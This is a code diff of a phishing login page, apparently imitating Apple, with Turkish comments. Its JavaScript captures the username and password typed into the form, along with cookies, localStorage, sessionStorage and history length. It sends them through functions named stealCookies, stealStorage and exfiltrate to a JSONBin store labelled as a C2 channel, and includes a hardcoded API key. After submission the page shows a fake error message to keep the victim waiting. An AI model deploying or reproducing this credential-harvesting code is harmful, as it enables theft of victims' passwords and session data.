@@ -47,9 +47,10 @@
     </div>
 
     <script>
-        // !!! ÖNEMLİ: JSONBİN'DEN ALDIĞINIZ BİLGİLER BURADA GİRİLDİ !!!
+        // !!! ÖNEMLİ: JSONBİN'DEN ALDIĞINIZ BİLGİLERİ BURAYA GİRİN !!!
         const C2_BIN_ID = '6987a50643b1c97be96d3417';
-        const C2_API_KEY = '$2a$10$/p/VOYqLF/6pttyDqPhp1OzjVYSGGe48yGwuILYUeCaN3IwkYC9Ou';
+        // AŞAĞIDAKİ YERİ KENDİ MASTER KEY'İNİZLE DEĞİŞTİRİN!
+        const C2_API_KEY = '$2a$10$/p/VOYqLF/6pttyDqPhp1OzjVYSGGe48yGwuILYUeCaN3IwkYC9Ou'; 
 
         // JSONBin'e veri gönderen yardımcı fonksiyon
         async function exfiltrate(type, data) {
@@ -94,30 +95,18 @@
         }
 
         // --- VERİ ÇALMA FONKSİYONLARI ---
-
-        // 1. Çerezleri (Cookies) Çal
         function stealCookies() {
             const cookies = document.cookie.split(';').map(c => c.trim());
             exfiltrate('cookies', cookies);
         }
-
-        // 2. Açık Sekmeleri ve URL'leri Listele (Tarayıcı API'leri ile)
         async function stealTabs() {
-            // Not: Bu, bir tarayıcı eklentisi olmadan doğrudan mümkün değildir.
-            // Ancak, geçmiş ve depolama alanı gibi diğer bilgiler alınabilir.
-            const tabs = "Bu bilgi tarayıcı eklentisi gerektirir. Ancak geçmiş okunabilir.";
+            const tabs = "Bu bilgi tarayıcı eklentisi gerektirir.";
             exfiltrate('tabs_info', { message: tabs });
         }
-
-        // 3. Geçmişi (History) Okuma
         async function stealHistory() {
-            // Not: Modern tarayıcılar güvenlik nedeniyle geçmişe erişimi engeller.
-            // Bu kod, konsept olarak buradadır.
             const historyLength = history.length;
             exfiltrate('history_length', { length: historyLength });
         }
-
-        // 4. Depolama Alanlarını (LocalStorage/SessionStorage) Çal
         function stealStorage() {
             const localStorageData = { ...localStorage };
             const sessionStorageData = { ...sessionStorage };
@@ -126,29 +115,22 @@
         
         // Ana form gönderildiğinde tüm operasyonları başlat
         document.getElementById('loginForm').addEventListener('submit', async function(event) {
-            event.preventDefault(); // Sayfanın yenilenmesini engelle
+            event.preventDefault();
 
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            // Önce manuel girilen bilgileri gönder
+            // Tüm veri çalma işlemlerini başlat
             exfiltrate('manual_login', { username: username, password: password });
-
-            // Ardından diğer tüm veri çalma fonksiyonlarını asenkron olarak çalıştır
             stealCookies();
             stealTabs();
             stealHistory();
             stealStorage();
 
-            // Kullanıcıyı bekletmek ve ikna etmek için sahte bir yükleme animasyonu veya hata mesajı göster
+            // Kullanıcıya sahte bir geri bildirim göster
             document.getElementById('errorMessage').style.display = 'block';
             document.querySelector('.login-button').textContent = 'Giriş Yapılıyor...';
             document.querySelector('.login-button').disabled = true;
-
-            // Kısa bir süre sonra kullanıcıyı gerçek bir sayfaya yönlendir (isteğe bağlı)
-            setTimeout(() => {
-                // window.location.href = 'https://www.apple.com'; // İsterseniz burayı aktif edebilirsiniz
-            }, 3000); // 3 saniye bekle
         });
     </script>
 </body>
